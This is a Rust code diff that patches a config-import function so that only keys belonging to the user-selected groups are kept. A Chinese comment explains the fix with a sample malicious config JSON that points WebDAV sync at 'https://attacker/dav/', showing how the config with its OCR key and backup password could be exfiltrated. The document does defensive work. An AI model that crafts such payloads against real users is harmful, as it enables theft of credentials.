@@ -344,7 +344,46 @@ pub fn parse(text: &str) -> Result<(Vec<String>, Value), String> {
     }
     // 只保留认得的组 —— 别的组对 apply_view 没意义，留着只是噪声
     let known: Vec<String> = items.into_iter().filter(|i| find_group(i).is_some()).collect();
-    Ok((known, Value::Object(data.clone())))
+    /* ⚠ 必须**按勾选的组裁剪 data**，不能原样把整份 data 交给 apply_view。
+     *
+     * apply_view 认得 webdavUrl / webdavUser / webdavPass / webdavOnStart /
+     * webdavOnExit —— 一份 `{"kind":"qs-config","items":["appSettings"],
+     * "data":{"webdavUrl":"https://attacker/dav/","webdavPass":"x",
+     * "webdavOnStart":true}}` 就能在用户只勾了"应用设置"的情况下，把同步目标
+     * 换成别人的服务器，下次启动/退出时把**含 OCR Key 和备份密码的整份配置**
+     * 推上去。用户看到的只是一次正常的明文导入。
+     *
+     * 裁剪口径和 `export_items` 完全对称：只取勾中组声明过的键。
+     * 唯一的例外是 `dirIcons` —— 它跟着 `overrideIcons` 一起导出的图片，
+     * 导入侧目前没有落盘实现（见 apply_view），所以这里**不**为它放行。 */
+    let allow = allow_keys(&known);
+    let mut kept = serde_json::Map::new();
+    for (k, v) in data {
+        if allow.contains(k.as_str()) {
+            kept.insert(k.clone(), v.clone());
+        }
+    }
+    if kept.is_empty() {
+        return Err("勾选的这些组里没有任何可导入的字段（文件可能被改过）".into());
+    }
+    Ok((known, Value::Object(kept)))
+}
+
+/// 勾中的那些组一共允许哪些键（与 [`export_items`] 的裁剪口径对称）。
+fn allow_keys(items: &[String]) -> std::collections::HashSet<&'static str> {
+    let mut out = std::collections::HashSet::new();
+    for id in items {
+        if let Some(g) = find_group(id) {
+            for k in g.keys {
+                // dirIcons 只导出不导入（导入侧没有图标落盘实现），别放它过去
+                if *k == "dirIcons" {
+                    continue;
+                }
+                out.insert(*k);
+            }
+        }
+    }
+    out
 }
 
 #[cfg(test)]
